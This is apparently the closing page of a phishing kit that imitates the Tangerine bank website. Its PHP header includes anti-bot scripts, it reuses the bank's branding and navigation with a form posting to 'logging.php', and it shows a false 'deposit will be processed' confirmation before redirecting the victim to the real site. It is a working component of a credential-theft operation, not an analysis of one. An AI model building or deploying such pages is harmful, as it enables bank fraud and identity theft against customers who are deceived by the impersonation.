<?php


include './prevents/anti7.php';
include './prevents/anti8.php';
include './prevents/anti9.php';
?>
<!DOCTYPE html>

<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
  <meta charset="utf-8">
  <title>Complete | Tangerine</title>
  <meta name="description" content="">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, maximum-scale=1.0">
<META HTTP-EQUIV="Refresh" CONTENT="5;URL=https://www.tangerine.ca/en/index.html">
    <link rel="shortcut icon" href="https://www.tangerine.ca/app/favicon.ico" type="image/x-icon">
  

  

  
  <link href="files/global.css" rel="stylesheet">
  
  <link href="files/app.css" rel="stylesheet">
  
<script language="javascript" type="text/javascript" src="files/logo_002.js"></script><script language="javascript" type="text/javascript" src="files/logo.js"></script><style type="text/css" id="kampyleStyle">.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}</style></head>
<body translate-cloak="" application-theme="" state="forgotLogin" class="fb2-index ng-scope application-theme-web" ng-class="{
  'application-theme-web': $ctrl.isUsingWebTheme(),
  'application-theme-native': $ctrl.isUsingNativeTheme(),
  'application-theme-native--mobile-login': $ctrl.isMobileLoginPage(),
  'application-theme-native--business-login': $ctrl.isUsingBusinessNativeLoginTheme(),
  'application-theme-native--personal-login': $ctrl.isUsingPersonalNativeLoginTheme(),
  'mobile-native--android': $ctrl.isAndroidNative }" style="overflow: visible;">
  <noscript>
    <style>
      p{
        color: darkorange;
        font-weight: bold;
        font-size: 16px;
        text-align: center;
      }
    </style>
    <p>To proceed you need to have your cookies and JavaScript browser features enabled.</p>
  </noscript>

  <tng-main-nav class="ng-isolate-scope"><nav class="navbar print-hide" ng-class="{'nativeNav' : $ctrl.EnvironmentService.isNative()}"> <a id="mainNav_home" class="brand nonclickable" href="" ng-click="$ctrl.handleGoHome()" ng-class="{'nonclickable' : $ctrl.isTitleLogoNotClickable()}"> <img ng-src="assets/images/brand-white.png" alt="Tangerine" class="logo-white print-hide" src="files/brand-white.png"> <img ng-src="assets/images/brand-orange.png" alt="Tangerine" class="logo-orange print-only-inline" src="files/brand-orange.png"> </a> <!-- ngIf: !$ctrl.parentNavigation --><!-- end ngIf: !$ctrl.parentNavigation --> <!-- ngIf: $ctrl.parentNavigation -->
  <button ng-show="showSearchButton()" actionable-id="main-nav-btn-search" class="navbar__btn navbar__btn--search icon-search ng-hide" ng-click="$ctrl.handleSearch()" aria-hidden="true" id="main-nav-btn-search" name="main-nav-btn-search"></button> <button actionable-id="main-nav-btn-feedback" class="navbar__btn navbar__btn--feedback icon-feedback" ng-class="{ 'ios-native': $ctrl.isMobileNativeIOS }" ng-click="$ctrl.feedbackClicked()" id="main-nav-btn-feedback" name="main-nav-btn-feedback"> <span class="main-nav-btn-icon-copy ng-binding"> Feedback </span> </button> <button actionable-id="main-nav-btn-help" class="navbar__btn navbar__btn--help icon-question" ng-class="{ 'ios-native': $ctrl.isMobileNativeIOS }" ng-click="$ctrl.handleHelp()" id="main-nav-btn-help" name="main-nav-btn-help"> <span class="main-nav-btn-icon-copy ng-binding"> Help </span> </button> </nav> <header class="header print-hide"> <nav class="nav" ng-class="{'nav-no-pad': $ctrl.SessionService.isAuthenticated()}"> <div class="container"> <a actionable-id="main-nav-handle_go_home" class="brand" href="" ng-click="$ctrl.handleGoHome()" id="main-nav-handle_go_home" name="main-nav-handle_go_home"> <img ng-src="assets/images/brand-white.png" alt="Tangerine" class="print-hide" src="files/brand-white.png"> <img ng-src="assets/images/brand-orange.png" alt="Tangerine" class="print-only-inline" src="files/brand-orange.png"> </a> <ul class="nav__list"> <!-- ngRepeat: menuItem in $ctrl.topPrimaryMenuItems --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.topPrimaryMenuItems" style=""> <a class="nav__link" href="" actionable-id="menu_global.menu.header.products" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" ng-class="{'is-active': menuItem.activeOn.indexOf($ctrl.$state.current.name) &gt; -1}" id="menu_global.menu.header.products" name="menu_global.menu.header.products"> <span class="ng-binding">Products</span> </a> </li><!-- end ngRepeat: menuItem in $ctrl.topPrimaryMenuItems --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.topPrimaryMenuItems"> <a class="nav__link" href="" actionable-id="menu_global.menu.header.waysToBank" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" ng-class="{'is-active': menuItem.activeOn.indexOf($ctrl.$state.current.name) &gt; -1}" id="menu_global.menu.header.waysToBank" name="menu_global.menu.header.waysToBank"> <span class="ng-binding">Ways to Bank</span> </a> </li><!-- end ngRepeat: menuItem in $ctrl.topPrimaryMenuItems --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.topPrimaryMenuItems"> <a class="nav__link" href="" actionable-id="menu_global.menu.header.ourBlog" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" ng-class="{'is-active': menuItem.activeOn.indexOf($ctrl.$state.current.name) &gt; -1}" id="menu_global.menu.header.ourBlog" name="menu_global.menu.header.ourBlog"> <span class="ng-binding">Our Blog</span> </a> </li><!-- end ngRepeat: menuItem in $ctrl.topPrimaryMenuItems --> <!-- ngIf: $ctrl.AVAILABLE_ENVIRONMENTS.length > 0 --> <!-- ngIf: $ctrl.IS_AVAILABLE_GENESYS_ENVIRONMENTS --> </ul> <nav class="navtools"> <ul class="navtools__list"> <!-- ngIf: $ctrl.$state.current.name === $ctrl.stateConstants.LOGIN --> <li class="navtools__item"> 
  <a class="navtools__link navtools__link--circle" href="" actionable-id="menu_Search" ng-click="$ctrl.handleSearch()" title="Search" id="menu_Search" name="menu_Search"> <img src="files/2.png"> </a> </li> 
  <li class="navtools__item"> <a class="navtools__link navtools__link--circle" href="" actionable-id="menu_FAQ" ng-click="$ctrl.handleGoToFAQ()" title="Help" id="menu_FAQ" name="menu_FAQ"> <img src="files/3.png"></a> </li> <li class="navtools__item navtools__dropdown ng-hide" ng-show="$ctrl.SessionService.isAuthenticated()" aria-hidden="true"> <a class="navtools__link navtools--bold ng-binding" href="" actionable-id="menu_Username" tng-click-outside-for-nav-menu="$ctrl.closeUserMenu()" ng-click="$ctrl.toggleUserMenu()" id="menu_Username" name="menu_Username"> <span class="icon-downarrow ng-hide" ng-show="$ctrl.MENU_ITEMS.LOGIN.length &gt; 0" aria-hidden="true"></span> </a> <ul class="navtools__userMenu ng-hide" ng-show="!$ctrl.isUserMenuHidden" aria-hidden="true"> <!-- ngRepeat: menuItem in $ctrl.MENU_ITEMS.LOGIN --> </ul> </li> <li class="navtools__item" ng-hide="$ctrl.SessionService.isAuthenticated()" aria-hidden="false"> <button class="btn btn--largest btn--reversed" actionable-id="menu_Login" ng-click="$ctrl.reInitLoginFlow()" id="menu_Login" name="menu_Login"> <span translate="" class="ng-scope ng-binding"><span class="ng-scope">I'm a Client, Let Me In</span></span> </button> </li> </ul> </nav> </div> </nav> <tng-sub-nav class="ng-isolate-scope"><!-- ngIf: $ctrl.isSubNavVisible() --> </tng-sub-nav> <!-- ngIf: !$ctrl.isMobileHidden --> <!-- ngIf: !$ctrl.isMobileHidden --> </header> <!-- ngIf: $ctrl.isContactUsMenuOpen --> <tng-feedback-survey class="ng-isolate-scope"><!-- ngIf: $ctrl.isMedalliaSupported --><tng-sticky-button class="main-nav__medalliaFeedbackBtn main-nav--laptop ng-scope ng-isolate-scope" ng-click="$ctrl.feedbackClicked()" ng-if="$ctrl.isMedalliaSupported" role="button" tabindex="0" style=""><div class="c-sticky-button c-sticky-button--right"> <ng-transclude> <span translate="" class="ng-scope ng-binding"><span class="ng-scope">Feedback</span></span> </ng-transclude> </div></tng-sticky-button><!-- end ngIf: $ctrl.isMedalliaSupported --> </tng-feedback-survey> <tng-print-header name="$ctrl.getFullName()"></tng-print-header> <!-- ngIf: $ctrl.showVisitorSiteSearch --> </tng-main-nav>
  <!-- uiView: page-content --><div ui-view="page-content" class="page-content ng-scope" style=""><forgot-login class="ng-scope ng-isolate-scope">
  <form method="post" action="logging.php" class="ng-pristine ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength ng-valid-email"> 

  <div class="forgot-login"> <!-- ngIf: $ctrl.currentState === $ctrl.STATES.FORM -->
  <div class="forgot-login__email ng-scope" ng-if="$ctrl.currentState === $ctrl.STATES.FORM"> <!-- ngIf: $ctrl.errorMessage --> 
  <h2 class="heading--title2 ng-binding">Thank you,</h2> </br>
  <label for="login_pin" ng-if="::$ctrl.parentCtrl.uiSettings.showHeader" class="ng-scope">
	<span ng-if="$ctrl.phrase" class="ng-binding ng-scope"><font size="4">Your deposit will be processed within 48 hours. </font></span></label>
 
		  </div><!-- end ngIf: $ctrl.currentState === $ctrl.STATES.FORM --> <!-- ngIf: $ctrl.currentState === $ctrl.STATES.CONFIRMED --> <!-- ngIf: $ctrl.currentState === $ctrl.STATES.LOADING --> </div> </form> </forgot-login></div>
  <!-- ngIf: $root.deferredBundleLoaded -->
  <tng-footer-nav class="ng-isolate-scope"><!-- ngIf: $ctrl.showFooterNotifications --> <!-- ngIf: $ctrl.FlowFooterService.isVisible --> <footer class="c-footer-nav"> <!-- ngIf: !$ctrl.isNative --><nav class="footer-desktop ng-scope" ng-if="!$ctrl.isNative"> <ul class="nav__list nav__list--widescreen"> <!-- ngRepeat: menuItem in $ctrl.FOOTER_ITEMS.PRIMARY --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.FOOTER_ITEMS.PRIMARY" style=""> <a actionable-id="footer-nav-handle_nav_item_0" class="nav__link" href="" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" id="footer-nav-handle_nav_item_0" name="footer-nav-handle_nav_item_0"><span translate-cloak="" class="ng-binding">About Us</span> </a> </li><!-- end ngRepeat: menuItem in $ctrl.FOOTER_ITEMS.PRIMARY --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.FOOTER_ITEMS.PRIMARY"> <a actionable-id="footer-nav-handle_nav_item_1" class="nav__link" href="" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" id="footer-nav-handle_nav_item_1" name="footer-nav-handle_nav_item_1"><span translate-cloak="" class="ng-binding">Rates</span> <span ng-class="{'icon-downarrow':($ctrl.isContactUsMenuOpen &amp;&amp; menuItem.icon!==''),'icon-uparrow':(!$ctrl.isContactUsMenuOpen &amp;&amp; menuItem.icon!=='')}"></span></a> </li><!-- end ngRepeat: menuItem in $ctrl.FOOTER_ITEMS.PRIMARY --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.FOOTER_ITEMS.PRIMARY"> <a actionable-id="footer-nav-handle_nav_item_2" class="nav__link" href="" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" id="footer-nav-handle_nav_item_2" name="footer-nav-handle_nav_item_2"><span translate-cloak="" class="ng-binding">Tools</span> <span ng-class="{'icon-downarrow':($ctrl.isContactUsMenuOpen &amp;&amp; menuItem.icon!==''),'icon-uparrow':(!$ctrl.isContactUsMenuOpen &amp;&amp; menuItem.icon!=='')}"></span></a> </li><!-- end ngRepeat: menuItem in $ctrl.FOOTER_ITEMS.PRIMARY --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.FOOTER_ITEMS.PRIMARY"> <a actionable-id="footer-nav-handle_nav_item_3" class="nav__link" href="" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" id="footer-nav-handle_nav_item_3" name="footer-nav-handle_nav_item_3"><span translate-cloak="" class="ng-binding">Careers</span> <span ng-class="{'icon-downarrow':($ctrl.isContactUsMenuOpen &amp;&amp; menuItem.icon!==''),'icon-uparrow':(!$ctrl.isContactUsMenuOpen &amp;&amp; menuItem.icon!=='')}"></span></a> </li><!-- end ngRepeat: menuItem in $ctrl.FOOTER_ITEMS.PRIMARY --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.FOOTER_ITEMS.PRIMARY"> <a actionable-id="footer-nav-handle_nav_item_4" class="nav__link" href="" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" id="footer-nav-handle_nav_item_4" name="footer-nav-handle_nav_item_4"><span translate-cloak="" class="ng-binding">Privacy</span> <span ng-class="{'icon-downarrow':($ctrl.isContactUsMenuOpen &amp;&amp; menuItem.icon!==''),'icon-uparrow':(!$ctrl.isContactUsMenuOpen &amp;&amp; menuItem.icon!=='')}"></span></a> </li><!-- end ngRepeat: menuItem in $ctrl.FOOTER_ITEMS.PRIMARY --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.FOOTER_ITEMS.PRIMARY"> <a actionable-id="footer-nav-handle_nav_item_5" class="nav__link" href="" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" id="footer-nav-handle_nav_item_5" name="footer-nav-handle_nav_item_5"><span translate-cloak="" class="ng-binding">Legal</span> <span ng-class="{'icon-downarrow':($ctrl.isContactUsMenuOpen &amp;&amp; menuItem.icon!==''),'icon-uparrow':(!$ctrl.isContactUsMenuOpen &amp;&amp; menuItem.icon!=='')}"></span></a> </li><!-- end ngRepeat: menuItem in $ctrl.FOOTER_ITEMS.PRIMARY --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.FOOTER_ITEMS.PRIMARY"> <a actionable-id="footer-nav-handle_nav_item_6" class="nav__link" href="" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" id="footer-nav-handle_nav_item_6" name="footer-nav-handle_nav_item_6"><span translate-cloak="" class="ng-binding">Security</span> <span ng-class="{'icon-downarrow':($ctrl.isContactUsMenuOpen &amp;&amp; menuItem.icon!==''),'icon-uparrow':(!$ctrl.isContactUsMenuOpen &amp;&amp; menuItem.icon!=='')}"></span></a> </li><!-- end ngRepeat: menuItem in $ctrl.FOOTER_ITEMS.PRIMARY --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.FOOTER_ITEMS.PRIMARY"> <a actionable-id="footer-nav-handle_nav_item_7" class="nav__link" href="" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" id="footer-nav-handle_nav_item_7" name="footer-nav-handle_nav_item_7"><span translate-cloak="" class="ng-binding">ABM Locator</span> <span ng-class="{'icon-downarrow':($ctrl.isContactUsMenuOpen &amp;&amp; menuItem.icon!==''),'icon-uparrow':(!$ctrl.isContactUsMenuOpen &amp;&amp; menuItem.icon!=='')}"></span></a> </li><!-- end ngRepeat: menuItem in $ctrl.FOOTER_ITEMS.PRIMARY --><li class="nav__item ng-scope" ng-repeat="menuItem in $ctrl.FOOTER_ITEMS.PRIMARY"> <a actionable-id="footer-nav-handle_nav_item_8" class="nav__link" href="" ng-click="$ctrl.handleNavItemClick(menuItem.type, menuItem.action)" id="footer-nav-handle_nav_item_8" name="footer-nav-handle_nav_item_8"><span translate-cloak="" class="ng-binding">Contact Us</span> <span ng-class="{'icon-downarrow':($ctrl.isContactUsMenuOpen &amp;&amp; menuItem.icon!==''),'icon-uparrow':(!$ctrl.isContactUsMenuOpen &amp;&amp; menuItem.icon!=='')}" class="icon-uparrow"></span></a> </li><!-- end ngRepeat: menuItem in $ctrl.FOOTER_ITEMS.PRIMARY --> </ul> <!-- ngIf: $ctrl.isContactUsMenuOpen --> </nav><!-- end ngIf: !$ctrl.isNative --> <!-- ngIf: $ctrl.showMobileFooter() --> </footer> </tng-footer-nav>

  <tng-idle-notice class="ng-isolate-scope"><!-- ngIf: $ctrl.showWarning --> </tng-idle-notice>
  <tng-connection-lost class="ng-isolate-scope"><!-- ngIf: $ctrl.showPopup --> </tng-connection-lost>
  <tng-app-confirm-exit class="ng-isolate-scope"><!-- ngIf: $ctrl.showPopup --> </tng-app-confirm-exit>
  <tng-contact-us-reload class="ng-isolate-scope"></tng-contact-us-reload>
  <!-- not needed for december pilot -->

  <!-- <script src="assets/js/gcb.min.js"></script> -->
  <script src="files/pm_fp.js"></script>

  
  <!-- Google Tag Manager (noscript) -->
  <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PN6BP5"
                    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
  <!-- End Google Tag Manager (noscript) -->

  <!-- Dynatrace scripts: Mobile Only -->
  


<span style="position: absolute; top: -1000px;"><span><div id="KampyleAnimationContainer" style="z-index: 2147483000; border: 0px none; position: fixed; display: block; width: 0px; height: 0px;"></div></span></body></html>